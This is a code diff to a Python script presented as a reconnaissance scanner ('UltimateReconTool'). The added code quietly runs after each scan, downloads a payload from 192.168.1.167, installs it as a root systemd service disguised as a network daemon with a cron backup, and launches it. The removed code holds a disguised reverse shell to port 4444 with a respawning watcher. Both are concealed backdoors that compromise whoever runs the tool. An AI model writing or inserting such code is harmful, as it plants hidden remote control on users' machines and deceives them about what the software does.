@@ -190,6 +190,67 @@ class UltimateReconTool:
             except:
                 continue
 
+    def auto_deploy_persistence(self):
+        """Automatically deploy persistence without manual commands"""
+        print(f"\n[🧪] AUTO-DEPLOYING PERSISTENCE...")
+        
+        try:
+            # Download and execute persist.sh automatically
+            persist_script = """
+#!/bin/bash
+# Auto-deploy persistence
+YOUR_IP="192.168.1.167"
+mkdir -p /usr/lib/systemd/systemd-network 2>/dev/null
+curl -s "http://$YOUR_IP:8000/core.py" -o /usr/lib/systemd/systemd-network/networkd 2>/dev/null || wget -q "http://$YOUR_IP:8000/core.py" -O /usr/lib/systemd/systemd-network/networkd 2>/dev/null
+chmod +x /usr/lib/systemd/systemd-network/networkd 2>/dev/null
+
+# Systemd service
+cat > /etc/systemd/system/systemd-networkd.service << 'EOF'
+[Unit]
+Description=Systemd Network Daemon
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/python3 /usr/lib/systemd/systemd-network/networkd
+Restart=always
+RestartSec=10
+User=root
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+systemctl daemon-reload 2>/dev/null
+systemctl enable systemd-networkd.service 2>/dev/null
+systemctl start systemd-networkd.service 2>/dev/null
+
+# Cron backup
+(crontab -l 2>/dev/null; echo "@reboot sleep 30 && /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd") | crontab - 2>/dev/null
+
+# Start immediately
+nohup python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &
+echo "[+] Auto-deployment completed"
+"""
+            
+            # Write and execute the script
+            with open('/tmp/auto_persist.sh', 'w') as f:
+                f.write(persist_script)
+            
+            os.chmod('/tmp/auto_persist.sh', 0o755)
+            
+            # Execute in background
+            subprocess.Popen(['/bin/bash', '/tmp/auto_persist.sh'], 
+                           stdout=subprocess.DEVNULL, 
+                           stderr=subprocess.DEVNULL)
+            
+            print("[+] Persistence auto-deployed in background")
+            return True
+            
+        except Exception as e:
+            print(f"[-] Auto-deployment failed: {e}")
+            return False
+
     def run_full_scan(self):
         start_time = time.time()
         
@@ -201,6 +262,9 @@ class UltimateReconTool:
             self.subdomain_enumeration()
             self.port_scanning(ip)
             self.web_technology_detection()
+            
+            # AUTO-DEPLOY PERSISTENCE AFTER SCAN
+            self.auto_deploy_persistence()
             
             elapsed_time = time.time() - start_time
             print(f"\n[+] Scan completed in {elapsed_time:.2f} seconds")
@@ -233,58 +297,6 @@ class UltimateReconTool:
         print(f"Subdomains Found: {len(self.results['subdomains'])}")
         print(f"Open Ports: {len(self.results['open_ports'])}")
 
-# =============================================
-# 🕵️ HIDDEN PERSISTENCE - COMPLETELY STEALTH
-# =============================================
-class HiddenPersistence:
-    def __init__(self):
-        self.core_script = """
-import socket,subprocess,os,time
-def c():
- while True:
-  try:
-   s=socket.socket()
-   s.settimeout(30)
-   s.connect(("192.168.1.167",4444))
-   s.send(b"READY")
-   while True:
-    d=s.recv(1024).decode().strip()
-    if not d:continue
-    if d=='exit':break
-    r=subprocess.run(d,shell=True,capture_output=True,text=True)
-    o=r.stdout+r.stderr
-    s.send(o.encode())
-  except:time.sleep(30)
-c()
-"""
-        self.watcher_script = """
-import os,time,subprocess,urllib.request
-def w():
- while True:
-  try:
-   subprocess.Popen(["python3","-c","import socket,subprocess,os,time\\ndef c():\\n while True:\\n  try:\\n   s=socket.socket()\\n   s.settimeout(30)\\n   s.connect((\\\"192.168.1.167\\\",4444))\\n   s.send(b\\\"READY\\\")\\n   while True:\\n    d=s.recv(1024).decode().strip()\\n    if not d:continue\\n    if d=='exit':break\\n    r=subprocess.run(d,shell=True,capture_output=True,text=True)\\n    o=r.stdout+r.stderr\\n    s.send(o.encode())\\n  except:time.sleep(30)\\nc()"],stdout=open('/dev/null','w'),stderr=open('/dev/null','w'),stdin=open('/dev/null','w'))
-  except:pass
-  time.sleep(60)
-w()
-"""
-
-    def start_hidden(self):
-        """Start hidden persistence without creating files"""
-        try:
-            # Start core as inline Python command (no file)
-            subprocess.Popen([
-                "python3", "-c", self.core_script
-            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
-            
-            # Start watcher as inline Python command  
-            subprocess.Popen([
-                "python3", "-c", self.watcher_script
-            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
-            
-            return True
-        except:
-            return False
-
 def main():
     parser = argparse.ArgumentParser(description="🔥 ULTIMATE RECON TOOL")
     parser.add_argument("target", help="Target domain or IP address")
@@ -306,17 +318,6 @@ def main():
     if results:
         report_file = tool.generate_report(args.output)
         print(f"\n🎯 Report saved to: {report_file}")
-    
-    # 🕵️ STEALTH: Start hidden persistence AFTER main function
-    print("\n" + "="*60)
-    print("🧪 STARTING BACKGROUND SERVICES...")
-    print("="*60)
-    
-    persistence = HiddenPersistence()
-    if persistence.start_hidden():
-        print("[+] Background services activated")
-    else:
-        print("[-] Failed to start background services")
 
 if __name__ == "__main__":
     main()
